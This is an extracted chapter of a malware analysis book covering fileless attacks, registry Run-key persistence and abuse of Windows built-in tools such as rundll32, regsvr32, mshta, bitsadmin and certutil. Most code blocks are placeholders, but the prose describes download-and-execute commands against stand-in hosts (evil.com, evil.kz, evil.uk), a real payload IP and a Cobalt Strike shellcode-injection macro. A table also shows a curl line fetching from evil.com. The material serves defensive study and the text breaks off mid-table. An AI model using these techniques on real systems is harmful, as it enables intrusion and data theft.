- en: <hgroup>
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">15</samp> <samp class="SANS_Dogma_OT_Bold_B_11">FILELESS,
    LIVING OFF THE LAND, AND ANTI-FORENSICS TECHNIQUES</samp>
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: </hgroup>
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/opener.jpg)'
  prefs: []
  type: TYPE_IMG
- en: No matter how covert modern malware is designed to be, it’s always bound to
    leave at least trace evidence of its existence in the victim environment. That
    evidence might be a persistence mechanism, such as a system startup task or service,
    or simply a file dropped to disk during the attack. In the latter case, once a
    file is on disk, defenses such as anti-malware have a better opportunity to detect
    the malware and thwart the attack. Trace evidence also can give investigators
    an edge in analyzing the attack post compromise. Malware authors, realizing this,
    have turned to fileless malware and anti-forensics techniques.
  prefs: []
  type: TYPE_NORMAL
- en: '*Fileless malware*, sometimes called *memory-resident malware*, is malware
    that doesn’t create or tamper with files on the hard disk; instead, its artifacts
    reside only in memory. More broadly, the term *fileless attack* denotes that the
    entire attack chain (or at least substantial parts of it) is fileless. Fileless
    attacks make malware detection more difficult for host defenses like anti-malware
    and make analysis more difficult for forensics investigators trying to understand
    the scope and impact of the attack. These attacks take advantage of techniques
    such as process injection, described in [Chapter 12](chapter12.xhtml), and Living
    Off The Land Binaries (LOLBins), discussed later in this chapter.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Anti-forensics* is a class of techniques in which the attacker attempts to
    conceal or remove traces of the attack in order to inhibit future forensics investigations.
    An attacker may instruct their malware to terminate itself and remove traces in
    memory, delete or corrupt files on disk, clear or tamper with logs and evidence,
    or even completely destroy the victim system, all in an attempt to inhibit future
    investigations. We’ll discuss anti-forensics later in this chapter. First, let’s
    dive deeper into fileless attacks.'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_B_11">How Fileless Attacks Work</samp>
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: While traditional malware threats often rely on files being written to the disk,
    fileless malware runs entirely (or nearly entirely) in memory to leave as little
    footprint on the victim host as possible. [Figure 15-1](chapter15.xhtml#fig15-1)
    illustrates a hypothetical but realistic fileless attack.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let’s break this attack down step by step. First, the malware author sends
    an email containing a malicious Microsoft Word document to the victim. The victim
    user happily opens the document (as people often do), which subsequently executes
    an embedded *Visual Basic for Applications* (*VBA) script*: a piece of code that
    can be embedded in legitimate documents to automate frequent tasks but is often
    abused for more malevolent purposes. The embedded VBA script invokes a built-in
    Windows utility called *certutil.exe* that downloads an encoded PowerShell script
    from the attacker’s staging server. Once the encoded script has downloaded, certutil
    decodes it and the script is executed using *powershell.exe*. This PowerShell
    script writes code to the Windows registry that will be executed upon a system
    reboot. Shortly thereafter, the victim user shuts down their laptop for the evening
    and heads home.'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-1.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-1: A fileless attack</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: Fast-forward 12 hours, when the user boots up their laptop to prepare for a
    new workday. Upon system boot-up, the malicious code stored inside the registry
    executes. It contains an obfuscated PowerShell command that downloads another
    script from the attacker’s staging server. This script is injected into the running
    PowerShell process, leaving no files on disk. The downloaded script contains bytecode
    that forms an executable in memory, which is then injected into a new process
    (*malware.exe*). The malware payload is an infostealer variant that begins harvesting
    sensitive data from the host.
  prefs: []
  type: TYPE_NORMAL
- en: This attack may seem overly complex, but to anyone who has experience in analyzing
    fileless attacks, it’s not at all far-fetched. In this scenario, there are a few
    interesting techniques being used. First, a malicious command is written to and
    stored in the registry. Fileless malware sometimes uses the registry to store
    commands, code, or configuration information in order to avoid writing new files
    to the disk. Since the registry is stored on disk in a proprietary binary format
    and is only in a human-readable state while resident in memory, this is still
    considered a fileless technique (see the “The Paradox of Fileless Attacks” box
    for more on this). Malware that hides in the registry is sometimes called *registry-resident
    malware* (which is a subcategory of fileless malware, but I’ll touch on that in
    a moment). The PowerShell command that executed from the registry also downloads
    and executes malicious code completely in memory.
  prefs: []
  type: TYPE_NORMAL
- en: Second, the Windows utilities invoked in this attack (*certutil.exe* and *powershell.exe*,
    specifically) can be classified as LOLBins, legitimate utilities that are built
    into Windows or otherwise already available on a target system. These utilities
    are used for common tasks such as system administration and maintenance, but they
    also can be easily abused to execute unauthorized code and hide malicious actions.
    Fileless attacks often take advantage of LOLBins, some of which can be invoked
    by malware to execute code in memory.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_B_11">Persistence and Registry-Resident Malware</samp>
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In the fileless attack scenario just described, the malware wrote a PowerShell
    command to the registry and set it to autostart on the next boot-up. The Windows
    registry can provide a safe place for malware to hide because it is unlikely to
    be discovered there, at least by someone who doesn’t know specifically what to
    look for. Not only that, but anti-malware and other endpoint defenses also may
    not be configured to scan the registry for malware.
  prefs: []
  type: TYPE_NORMAL
- en: 'This technique is one way malware tries to establish *persistence*: that is,
    remaining on an infected host even after a system reboot. Malware can use any
    of several tactics to persist on a victim system, but here we’ll focus on registry
    persistence because it ties in directly with registry-resident malware.'
  prefs: []
  type: TYPE_NORMAL
- en: '<samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    are special registry keys that are invoked when a user logs in to a system. They
    can point to file types like executable files and scripts and even accept command
    line parameters. They reside in the following registry locations:'
  prefs: []
  type: TYPE_NORMAL
- en: '*HKLM\Software\Microsoft\Windows\CurrentVersion\Run*'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '*HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce*'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '*HKCU\Software\Microsoft\Windows\CurrentVersion\Run*'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '*HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce*'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys are invoked
    each time the user logs in. The <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    keys are invoked only one time, at the next login. Each key consists of a name
    and a value that represents a command to be run or a file to be executed.
  prefs: []
  type: TYPE_NORMAL
- en: By manipulating these keys, a malware author can execute malware and its associated
    commands directly from the registry. To demonstrate, I’ve added a new <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp>
    key named <samp class="SANS_TheSansMonoCd_W5Regular_11">Evil</samp> to the registry
    key *HKLM\Software\Microsoft\Windows\CurrentVersion\Run*. [Figure 15-2](chapter15.xhtml#fig15-2)
    shows this key, which can be viewed and edited with *regedit.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-2.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-2: Adding a new malicious
    Run key to the registry</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: 'This key simply invokes *powershell.exe* and executes the <samp class="SANS_TheSansMonoCd_W5Regular_11">pause</samp>
    command. Now, every time I log in to my machine, a PowerShell prompt appears.
    Obviously, a malware author would rather do something a little more malicious
    than simply popping up a PowerShell prompt at each login. They might execute a
    more complex command like the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Once executed, when the user of the system logs in to Windows, this command
    downloads a PowerShell script (*evil.ps1)* from a remote web server (*evil.com)*
    and executes it directly in memory. We won’t touch on this command anymore here,
    as we’ll be covering PowerShell in more detail later in this chapter, but just
    keep in mind that malware can easily hide commands and code inside the registry,
    and using <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    keys is one way it can do so. [Table 15-1](chapter15.xhtml#tab15-1) shows a non-exhaustive
    list of other <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys and
    persistence locations in the registry.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Heavy_B_11">Table 15-1:</samp> <samp class="SANS_Futura_Std_Book_11">Registry
    Keys Malware May Use to Establish Persistence</samp>
  prefs: []
  type: TYPE_NORMAL
- en: '| <samp class="SANS_Futura_Std_Heavy_B_11">Registry hive/key</samp> | <samp
    class="SANS_Futura_Std_Heavy_B_11">Description</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| --- | --- |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr>Software\<wbr>Microsoft\<wbr>Windows\
    CurrentVersion\<wbr>Policies\<wbr>Explorer\<wbr>Run</samp><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>Software\<wbr>Microsoft\<wbr>Windows\'
  prefs: []
  type: TYPE_NORMAL
- en: CurrentVersion\<wbr>Policies\<wbr>Explorer\<wbr>Run</samp> | <samp class="SANS_Futura_Std_Book_11">These</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> <samp class="SANS_Futura_Std_Book_11">keys
    are similar to the keys already mentioned. Anything added to them will run upon
    user login. They are not created by default in Windows and so must be added manually.</samp>
    |
  prefs: []
  type: TYPE_NORMAL
- en: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr>Software\<wbr>Microsoft\<wbr>Windows
    NT\ CurrentVersion\<wbr>Winlogon</samp><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>Software\<wbr>Microsoft\<wbr>Windows
    NT\'
  prefs: []
  type: TYPE_NORMAL
- en: CurrentVersion\<wbr>Winlogon</samp> | <samp class="SANS_Futura_Std_Book_11">These
    keys contain Windows login configurations, including programs that execute upon
    login. These can be modified to run malware or malicious commands.</samp> |
  prefs: []
  type: TYPE_NORMAL
- en: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>System\<wbr>CurrentControlSet\<wbr>Services</samp>
    | <samp class="SANS_Futura_Std_Book_11">This key contains information on the services
    configured on the host. Drivers are included here as well, in</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>SYSTEM\<wbr>CurrentControlSet\​Services\<wbr><DriverName></samp><samp
    class="SANS_Futura_Std_Book_11">. If malware installs a persistence mechanism
    (or malicious driver) as a service, this can be seen here.</samp> |'
  prefs: []
  type: TYPE_TB
- en: This is only the very tip of the persistence mechanisms iceberg. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp>
    keys described here are some of the most commonly used for fileless persistence
    techniques, but there are others. For more information, visit the MITRE ATT&CK
    site at [*https://<wbr>attack<wbr>.mitre<wbr>.org<wbr>/tactics<wbr>/TA0003<wbr>/*](https://attack.mitre.org/tactics/TA0003/).
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_B_11">Living Off The Land Binaries</samp>
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Now let’s turn to another technique malware might use to launch fileless attacks:
    LOLBins. There are several reasons why malware might invoke a LOLBin:'
  prefs: []
  type: TYPE_NORMAL
- en: '**To bypass application restriction controls, such as AppLocker**'
  prefs: []
  type: TYPE_NORMAL
- en: AppLocker is a Windows security control for preventing unwanted applications
    from executing. Malware can bypass it by using system binaries as a proxy.
  prefs: []
  type: TYPE_NORMAL
- en: '**To avoid detection**'
  prefs: []
  type: TYPE_NORMAL
- en: EDR, anti-malware, and other endpoint defenses subject LOLBins to less scrutiny,
    since they’re often digitally signed and therefore verified by the operating system
    itself. Additionally, many LOLBins allow malicious code to execute in memory,
    which builds its evasion potency further.
  prefs: []
  type: TYPE_NORMAL
- en: '**To hide in the noise**'
  prefs: []
  type: TYPE_NORMAL
- en: Since daily sysadmin work requires the use of many LOLBins, it’s difficult to
    develop sound logic to detect the malicious use of these tools; the amount of
    noise they generate can be challenging for analysts to sift through.
  prefs: []
  type: TYPE_NORMAL
- en: '**To hamper investigations**'
  prefs: []
  type: TYPE_NORMAL
- en: Since many LOLBins actually allow the execution of malicious code in memory
    and support fileless attacks, investigating these attacks can sometimes be more
    difficult than it is for those that leave a larger footprint on disk.
  prefs: []
  type: TYPE_NORMAL
- en: The classification of LOLBins can be quite subjective. Some experts claim that
    LOLBins are legitimate applications that can be abused by threat actors in unexpected
    ways. However, this definition would eliminate all applications that can be abused
    by actors in “expected” ways (invoking *cmd.exe* to delete a file, for example).
    My school of thought is truer to the essence of an attacker “living off the land,”
    meaning that an attacker can and will use anything available to them, and “expected”
    and “unexpected” use cases aren’t taken into account. In my opinion, a LOLBin
    is any application or tool that is commonly available and can be abused by actors.
    Let’s look at how this is accomplished with the help of VBA code and macros.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">VBA Macro-Based Malware</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Living off the land techniques often begin with a malware-laced document that
    triggers the LOLBin’s attack chain. Such documents are commonly (but not always)
    Microsoft Word or Excel documents, and their malicious code is frequently in the
    form of VBA macros. *Macros* were originally designed to automate common user
    tasks in a document file, but as you’ll see, they’re also used by threat actors
    to deploy additional malware.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp>
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '*At the time of this writing, the abuse of VBA macros for malicious purposes
    has significantly decreased. By default, Microsoft Office now prevents macro execution
    from documents originating from untrusted sources, so this attack vector is more
    difficult to actualize. However, actors may be able to bypass these limitations
    or use other document formats, such as Rich Text Format (RTF) and Portable Document
    Format (PDF), to achieve similar effects.*'
  prefs: []
  type: TYPE_NORMAL
- en: 'VBA macro code is quite powerful; it can even import Windows DLLs and call
    WinAPI functions. For example, the attack tool Cobalt Strike uses a macro embedded
    inside a Microsoft Office document to inject shellcode into a running process
    and download an additional payload (called a *beacon*) from a malicious web server.
    Here’s an example of the Cobalt Strike stager macro code, which has been slightly
    modified for readability and brevity:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: There’s a lot going on here, so let’s go over it block by block. First, this
    code defines an array of bytes that, when converted to hexadecimal format, is
    actually malicious shellcode ❶. Next, the code checks whether the Windows environment
    is 32- or 64-bit and selects the appropriate directory (System32 for 32-bit architecture
    and SysWOW64 for 64-bit architecture) from which to invoke the Windows utility
    *rundll32.exe* ❷. The code invokes <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcessA</samp>
    to start an instance of *rundll32.exe* ❸ and then calls <samp class="SANS_TheSansMonoCd_W5Regular_11">VirtualAllocEx</samp>
    to allocate memory inside that process ❹. The allocated region of memory is the
    same size as the shellcode array.
  prefs: []
  type: TYPE_NORMAL
- en: Next, using a <samp class="SANS_TheSansMonoCd_W5Regular_11">for</samp> loop,
    the code writes each byte of shellcode into the newly allocated memory region
    using <samp class="SANS_TheSansMonoCd_W5Regular_11">WriteProcessMemory</samp>
    ❺. Finally, the macro code executes the injected shellcode inside the context
    of *rundll32.exe* by invoking <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateRemoteThread</samp>
    ❻. If you remember [Chapter 12](chapter12.xhtml), you may spot that this is a
    form of shellcode injection.
  prefs: []
  type: TYPE_NORMAL
- en: The *rundll32.exe* utility is one of the many LOLBins that exist in a Windows
    environment. (You’ll read more about it shortly.) In this case, the Cobalt Strike
    stager is using *rundll32.exe* as a sort of surrogate for its malicious code,
    hiding the code inside this process and potentially evading endpoint defense controls
    and pesky security analysts in the process.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we’ll discuss another technique to mask malicious code by abusing legitimate
    Windows utilities through the use of System Binary Proxy Execution.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">System Binary Proxy
    Execution</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: '*System Binary Proxy Execution* is a technique for executing code via a legitimate
    (and often digitally signed) Windows utility. One of the reasons for proxying
    execution through a signed binary is to bypass application-blocking controls like
    AppLocker. This type of attack can also help malware fly under the radar of endpoint
    defenses like anti-malware. This technique can abuse these file types:'
  prefs: []
  type: TYPE_NORMAL
- en: Binaries that are included by default in most Windows installations and thus
    exist in the vast majority of victim environments.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Binaries that are not included by default in Windows but are still very common.
    Examples are PSExec, a popular tool for system administration, and ProcDump, a
    tool for dumping the memory of a target process. As these utilities may or may
    not exist in the victim environment prior to the attack, they may need to be transferred
    to the victim system before being invoked. They won’t be discussed further in
    this book.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Let’s start taking a look at some of the most commonly used LOLBins for proxying
    execution.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Rundll32</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*Rundll32*, which you saw in the Cobalt Strike example, is an important binary
    used by many Windows applications to execute code from DLLs. If an application
    requires a specific DLL but does not load it directly (via <samp class="SANS_TheSansMonoCd_W5Regular_11">LoadLibrary</samp>,
    for example), it can invoke *rundll32.exe* and a specific exported function, like
    so:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'As you can see, rundll32 accepts two parameters: the name and path of the DLL
    file (in this case, *library.dll*) and the exported function that will be executed
    (<samp class="SANS_TheSansMonoCd_W5Regular_11">ExportedFunction</samp>). Malware
    can abuse *rundll32.exe* to execute code from a malicious DLL as well:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: Since rundll32 is run very frequently by the Windows operating system and various
    other benign processes, it is often used as a surrogate process for malicious
    code. In the Cobalt Strike stager example, it was spawned and injected with shellcode,
    then used to host and execute malicious code.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Regsvr32</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*Regsvr32* is an executable used to register and unregister DLL modules. Malware
    can take advantage of regsvr32 to execute malicious code within the context of
    the *regsvr32.exe* signed binary or even to download and execute malicious code
    from a remote server.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The Emotet malware family is notorious for using LOLBins as part of its attack
    chain. The payload for one particular strain of Emotet (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:
    d642109e621c6758027c2fc0e5ea3d1126963a001ab1858b95f82e09403943bd</samp>) was being
    delivered via malicious Microsoft Excel documents that downloaded multiple payloads
    and modules and subsequently executed them using *regsvr32.exe*. [Figure 15-3](chapter15.xhtml#fig15-3),
    a screenshot from Joe Sandbox, illustrates this attack chain.'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-3.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-3: The Emotet process
    tree shown in Joe Sandbox</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: 'Another notable example of regsvr32 in use is the strangely named Squiblydoo
    attack, which also leverages the Windows script component runtime DLL *scrobj.dll*
    that is normally used to execute local COM scriptlets. By combining the power
    of *regsvr32.exe* and *scrobj.dll*, the Squiblydoo malware downloads and executes
    a malicious COM scriptlet directly from the internet:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: This command downloads the malicious script *script.sct* from *http://<wbr>evil<wbr>.kz*
    and subsequently executes it using *scrobj.dll*, all while hiding inside the process
    address space of *regsvr32.exe*, completely in memory. More specifically, the
    <samp class="SANS_TheSansMonoCd_W5Regular_11">/s</samp> switch tells *regsvr32.exe*
    not to display a message to the victim (unwanted behavior for a threat actor).
    The <samp class="SANS_TheSansMonoCd_W5Regular_11">/i</samp> switch passes the
    following string (<samp class="SANS_TheSansMonoCd_W5Regular_11">http://evile.kz</samp>...)
    to the <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp> function
    inside *scrobj.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: This technique is able to work the way it does because the <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp>
    function inside the *scrobj.dll* file accepts a URL and blindly downloads and
    executes the script file. You can read more about the Squiblydoo technique at
    the MITRE Cyber Analytics Repository (CAR) at [*https://<wbr>car<wbr>.mitre<wbr>.org<wbr>/analytics<wbr>/CAR<wbr>-2019<wbr>-04<wbr>-003<wbr>/*](https://car.mitre.org/analytics/CAR-2019-04-003/).
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Mshta</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'Mshta is used to execute *HTML application* (.*hta*) files, which are script
    files that can contain HTML, VBScript, JavaScript, or other types of scripts.
    HTA files provide a GUI via HTML, and the script code provides the logic for the
    application. Malware often uses *mshta.exe* to download and execute files from
    remote servers, as in the following example from a malware-dropping Microsoft
    Excel file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'One particular malware sample (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:
    03f03a3f36c87d8cb7cd5f8ce6e324917253eeca4f3ea164f35242146e26e2b1</samp>) invokes
    *mshta.exe* via *rundll32.exe*, demonstrating how some attacks chain multiple
    LOLBins together. [Figure 15-4](chapter15.xhtml#fig15-4) shows the report from
    Joe Sandbox (*[https://www.joesandbox.com/analysis/670279](https://www.joesandbox.com/analysis/670279)*).'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-4.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-4: A LOLBin attack
    chain shown in an analysis report from Joe Sandbox</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: In this sandbox analysis, you can see that a Microsoft Excel document spawns
    *rundll32.exe* (likely via embedded VBA code or a similar technique), which subsequently
    invokes *mshta.exe* to download and execute a file hosted on *mediafire.net*.
  prefs: []
  type: TYPE_NORMAL
- en: '##### <samp class="SANS_Futura_Std_Bold_Condensed_B_11">BITSAdmin</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: '*Background Intelligence Transfer Service (BITS)* is used to transfer files
    to and from web servers and file shares. BITS can be configured in “jobs” that
    automatically manage the file transfer overhead, monitoring network usage, latency,
    and file sizes and allowing file transfers to be paused and resumed. The BITSAdmin
    application, *bitsadmin.exe*, is used to manage BITS.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Malware can abuse BITS to download and execute payloads from remote servers.
    The following command will create a new file transfer job called <samp class="SANS_TheSansMonoCd_W5Regular_11">myjob</samp>
    as a high priority, then download the file *malicious.exe* from the domain *evil.uk*,
    saving it in the *C:\Users\AppData\Roaming* directory:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">InstallUtil</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*InstallUtil* is a component of the Windows .NET framework and is used by the
    operating system and other applications to install server resources and services.
    It can also be used by malware to invoke executable and DLL files. The following
    command executes *evil.dll* in the context of *installutil.exe*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: A host may have many versions of .NET installed, so <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">version</samp>
    here would be replaced with a specific version such as <samp class="SANS_TheSansMonoCd_W5Regular_11">v4.0.30319</samp>.
    As with many LOLBins, *installutil.exe* is often used by system administrators
    for legitimate reasons, so it’s difficult to prevent this unauthorized usage,
    especially if it means limiting how administrators do their jobs. It’s better
    to either limit the user groups who are able to execute this utility or (at the
    very least) monitor the user groups’ usage of the utility and regularly review
    the logs.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Certutil</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'The *certutil.exe* binary is part of the Certificate Services component of
    Windows and can be used to display information on, verify, configure, and install
    digital certificates. There are a few interesting ways in which it can be abused
    by attackers. For instance, a malicious Microsoft Excel document (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:d009299a787cf9b7995827014e72525038eecd3e1f99820d66854fc865d39047</samp>)
    downloaded and executed a Lokibot payload from a remote server with the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: This command invokes certutil, downloads an executable file (*Zcldxvqciopgykje.exe*)
    from a web server (45.155.165.63), and executes it.
  prefs: []
  type: TYPE_NORMAL
- en: 'Malware can also use certutil to encode or decode a file, like so:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: The <samp class="SANS_TheSansMonoCd_W5Regular_11">-encode</samp> switch tells
    certutil to Base64-encode the file (we’ll talk about Base64 in [Chapter 16](chapter16.xhtml)).
    Encoding a file this way can serve as a crude method to hide a file on disk or
    to obfuscate data before exfiltrating it from the network in order to bypass network
    defenses. Certutil is a great example of a multipurpose LOLBin.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows Script Host</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'Windows includes several built-in utilities as part of the *Windows Script
    Host (WSH)* for running scripting languages such as VBScript (*.vbs* and *.vbe*
    files) and JavaScript (*.js* and *.jse* files). Utilities such as *wscript.exe*
    and *cscript.exe* are part of the WSH. These utilities can be executed from the
    command line or spawned as a new process and used to run various types of script
    files. Scripting is much simpler than coding an executable in, for instance, C++,
    so some malware takes advantage of this. One example, a Microsoft Word document
    (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: ccc8d5aa5d1a682c20b0806948bf06d1b5d11961887df70c8902d2146c6d1481</samp>)
    with embedded code, drops a JavaScript file to disk and executes the script using
    *wscript.exe* with this command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: Upon execution, this script downloads a sample from the malware family OriginLogger.
    This malicious document is part of a multistage attack that later invokes *mshta.exe*
    as well.
  prefs: []
  type: TYPE_NORMAL
- en: 'The *wscript.exe* binary can also be used to execute script files directly
    from NTFS Alternate Data Streams (ADS), which are covered later in this chapter.
    For now, just know that malware can hide files inside ADS, which effectively hides
    them from prying eyes and certain endpoint defenses. To execute a script file
    hidden in another file via an ADS, you’d use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: Scripts are generally outside the scope of this book, but note that modern threats
    often use scripting languages like JavaScript and VBScript, which can be easily
    executed in Windows with the built-in Windows script interpreters.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Windows Command Line
    and Other Utilities</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: The built-in Command Prompt (*cmd.exe*), which is the default command line utility
    in Windows, is widely used both for legitimate and malicious purposes. For example,
    malware can use the command line for terminating processes, deleting files, making
    system configuration changes, and deleting backups. Some of the commands it uses
    also could be classified as LOLBin attacks, since *cmd.exe* is often used to execute
    other utilities. Malware often invokes Command Prompt by creating a new process
    (by calling <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>,
    for instance) and passing in the command that it wishes to run as a parameter.
  prefs: []
  type: TYPE_NORMAL
- en: 'Perhaps the most common usage of Command Prompt is to directly execute other
    files and applications. This could look similar to the following code, which invokes
    an executable called *flashplayer.exe*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: '[Table 15-2](chapter15.xhtml#tab15-2) lists some other commands and utilities
    that are sometimes abused by malware to execute malicious actions. This list is
    by no means exhaustive, as there are many commands that can be invoked with *cmd.exe*.'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Heavy_B_11">Table 15-2:</samp> <samp class="SANS_Futura_Std_Book_11">Utilities
    and Commands Malware May Use</samp>
  prefs: []
  type: TYPE_NORMAL
- en: '| <samp class="SANS_Futura_Std_Heavy_B_11">Utility/command</samp> | <samp class="SANS_Futura_Std_Heavy_B_11">Example</samp>
    | <samp class="SANS_Futura_Std_Heavy_B_11">Description</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| --- | --- | --- |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">curl</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c curl -o output _file</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">https://evil.com/evil.gif</samp>
    | <samp class="SANS_Futura_Std_Book_11">Transfers data. Malware may use it to
    download additional payloads and write them to a file, or to exfiltrate data to
    a remote web server.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">del</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c del C:\Users\</samp><samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">David</samp><samp
